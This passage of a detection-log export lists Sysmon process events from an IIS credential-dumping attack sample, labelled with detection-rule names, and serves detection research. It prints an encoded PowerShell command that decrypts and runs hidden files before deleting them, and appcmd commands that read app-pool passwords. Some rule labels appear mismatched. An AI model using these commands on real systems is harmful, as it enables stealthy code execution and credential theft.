UAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3240
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-0010D763FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.230
"
2019-05-27T01:29:17.350815+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5889,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3096
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00109767FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.310
"
2019-05-27T01:29:17.581146+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5892,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2928
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-0010576BFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.420
"
2019-05-27T01:29:17.661261+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5895,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1340
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00108270FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.621
"
2019-05-27T01:29:17.731362+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5898,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2448
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00104474FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.691
"
2019-05-27T01:29:17.811477+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5901,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AF